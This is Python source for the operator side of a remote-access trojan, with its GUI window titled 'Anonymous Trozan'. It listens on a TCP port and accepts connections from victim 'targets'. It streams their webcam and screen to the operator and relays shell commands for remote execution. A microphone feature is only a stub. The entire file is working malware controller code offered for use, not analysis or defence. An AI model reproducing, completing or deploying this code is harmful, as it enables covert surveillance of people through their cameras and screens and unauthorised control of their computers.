import socket , cv2 , struct , sys , os , pickle
from threading import Thread
import tkinter as tk
from PIL import Image, ImageTk
import pygame

# Handling ,multiple target

global cam_access_flag, cmd_access_flag, scrn_access_flag, targets , client_conn_obj , waiting
cam_access_flag, cmd_access_flag, scrn_access_flag = 0, 0, 0
targets = {}
waiting = False


pygame.mixer.init()
hover = pygame.mixer.Sound('other_files/hover.wav')
click = pygame.mixer.Sound('other_files/click.wav')
click_error = pygame.mixer.Sound('other_files/click_error.wav')

def buff_clr():
    c = 0
    clr = 0
    client_conn_obj.settimeout(1.2)
    while True:
        print('clearing buffer ',c,end='\r')
        try:
            packet = client_conn_obj.recv(1024*4)
            c+=1
        except TimeoutError:
            client_conn_obj.settimeout(None)
            break



def recv_camera_data():
    global cam_access_flag
    data = b""
    payload_size = struct.calcsize('Q')
    while cam_access_flag:
        while len(data) < payload_size:
            packet = client_conn_obj.recv(1024*4)
            if not packet:
                break
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        while len(data) < msg_size:
            data += client_conn_obj.recv(1024*4)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)
        frame = cv2.resize(frame, (300, 300))
        cv2.imshow('Traget Camera', frame)
        if cv2.waitKey(1) == ord('q'):
            cv2.destroyAllWindows()
            cam_access_flag = 0
            client_conn_obj.send(str.encode("cam_cmd abort camera access"))
            buff_clr()
            print('aborted camera')
            break

def recv_cmd_data():
    global cmd_access_flag
    while cmd_access_flag:
        cmd = "internal_cmd " + input("Target cmd > ")
        if cmd[13:] == "abort":
            cmd_access_flag = 0
            break
        else:
            client_conn_obj.send(str.encode(cmd))
            recv_op = client_conn_obj.recv(1024)
            print(recv_op)

def recv_screen_data():
    print("recv_screen_data")
    global scrn_access_flag
    data = b""
    payload_size = struct.calcsize('Q')
    while scrn_access_flag:
        while len(data) < payload_size:
            packet = client_conn_obj.recv(1024*4)
            if not packet:
                break
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        while len(data) < msg_size:
            data += client_conn_obj.recv(1024*4)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow('Traget Screen', frame)
        if cv2.waitKey(1) == ord('q'):
            cv2.destroyAllWindows()
            scrn_access_flag = 0
            client_conn_obj.send(str.encode("scrn_cmd abort screen access"))
            buff_clr()
            break
    print('aborted screen')
    


def send_cmd(cmd):
    global cam_access_flag, cmd_access_flag, scrn_access_flag
    # while True:
    if cmd == "give camera access" and cam_access_flag != 1 and scrn_access_flag != 1:
        cam_access_flag = 1
        cmd = "cam_cmd "+"give camera access"
        client_conn_obj.send(str.encode(cmd))
        recv_camera_data_th = Thread(target=recv_camera_data)
        recv_camera_data_th.start()
    elif cmd == "give cmd access" and cmd_access_flag != 1:
        cmd_access_flag = 1
        recv_cmd_data_th = Thread(target=recv_cmd_data)
        recv_cmd_data_th.start()
    elif cmd == "give screen access" and scrn_access_flag != 1 and cam_access_flag!=1:
        scrn_access_flag = 1
        cmd = "scrn_cmd "+"give screen access"
        client_conn_obj.send(str.encode(cmd))
        recv_screen_data_th = Thread(target=recv_screen_data)
        recv_screen_data_th.start()

    else:
        print('Invalid command')

def accept_req():
    global waiting
    click.play()
    global client_conn_obj,targets
    server.listen()
    print('Waiting......')
    waiting = True
    client_conn_obj, address = server.accept()
    print('connectd to ', address)
    waiting = False
    targets["target_"+str(len(targets))] = [client_conn_obj,address]
    print(targets)

def accept_req_th_strat():
    global waiting
    if not waiting:
        accept_req_th = Thread(target=accept_req)
        accept_req_th.start()
    else:
        click_error.play()
        print("Checking in progress....")



def camera(btn):
    global cam_access_flag
    click.play()
    if cam_access_flag != 1:
        click.play()
        send_cmd("give camera access")
        btn.configure(text="Abort Camera")
    elif cam_access_flag == 1:
        click.play()
        cam_access_flag = 0
        client_conn_obj.send(str.encode("cam_cmd abort camera access"))
        buff_clr()
        print('aborted cam')
        btn.configure(text="Access Camera")

def screen(btn):
    global scrn_access_flag
    if scrn_access_flag != 1:
        click.play()
        send_cmd("give screen access")
        btn.configure(text="Abort Screen")
    elif scrn_access_flag == 1:
        click.play()
        scrn_access_flag = 0
        client_conn_obj.send(str.encode("scrn_cmd abort screen access"))
        buff_clr()
        print('aborted screen')
        btn.configure(text="Access Screen")

def microph():
    click.play()
    print("Microphone Access")

def cmd(btn):
    global cmd_access_flag
    if cmd_access_flag != 1:
        click.play()
        send_cmd("give cmd access")
        btn.configure(text="Abort Cmd")
    elif cmd_access_flag == 1:
        click.play()
        btn.configure(text="Access Cmd")

def on_enter(event):
    event.widget.config(bg='red', fg='cyan')
    event.widget.config(bg='red', fg='cyan')
    event.widget.config(bg='red', fg='cyan')
    event.widget.config(bg='red', fg='cyan')
    hover.play()   

def on_leave(event):
    event.widget.config(bg='red', fg='black')
    event.widget.config(bg='red', fg='black')
    event.widget.config(bg='red', fg='black')
    event.widget.config(bg='red', fg='black')

def Ui():
    window = tk.Tk()
    window.title("Anonymous Trozan")
    window.geometry("650x450+500+200")
    window.iconbitmap('other_files/logo.ico')
    window.resizable(False, False)

    bg_image_pil = Image.open("./other_files/hackerbg.jpg")
    bg_image = ImageTk.PhotoImage(bg_image_pil)
    bg_label = tk.Label(window, image=bg_image)
    bg_label.place(x=-1, y=-10, relwidth=1, relheight=1)


    b1_x = 140
    b1_y = 160

    button1 = tk.Button(window, text="Access Camera" , width=20 , height=2 ,  bg="red", fg="black" , font=("Verdana", 10, "bold italic") )
    button1.config(command=lambda:camera(button1))
    button1.place(x=b1_x , y=b1_y)
    button1.bind("<Enter>", on_enter)
    button1.bind("<Leave>", on_leave)

    button2 = tk.Button(window, text="Access Screen" , width=20 , height=2 ,  bg="red", fg="black" , font=("Verdana", 10, "bold italic") )
    button2.config(command=lambda:screen(button2))
    button2.place(x=b1_x,y=b1_y+100)
    button2.bind("<Enter>", on_enter)
    button2.bind("<Leave>", on_leave)

    button3 = tk.Button(window, text="Access Microphone" , width=20 , height=2 ,  bg="red", fg="black" , font=("Verdana", 10, "bold italic") )
    button3.config(command=lambda:microph(button3))
    button3.place(x=b1_x+250,y=b1_y)
    button3.bind("<Enter>", on_enter)
    button3.bind("<Leave>", on_leave)

    button4 = tk.Button(window, text="Access Comand Prompt" , width=20 , height=2 ,  bg="red", fg="black" , font=("Verdana", 10, "bold italic") )
    button4.config(command=lambda:cmd(button4))
    button4.place(x=b1_x+250,y=b1_y+100)
    button4.bind("<Enter>", on_enter)
    button4.bind("<Leave>", on_leave)

    button5 = tk.Button(window, text="Accept Requests" , width=20 , height=2 ,  bg="red", fg="black" , font=("Verdana", 10, "bold italic") )
    button5.config(command=lambda:accept_req_th_strat())
    button5.place(x=b1_x+100,y=b1_y+200)
    button5.bind("<Enter>", on_enter)
    button5.bind("<Leave>", on_leave)

    window.mainloop()


host, port = '', 9999
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Socket created...')
server.bind((host, port))
print('Server is ready....')


Ui_th = Thread(target=Ui)
Ui_th.start()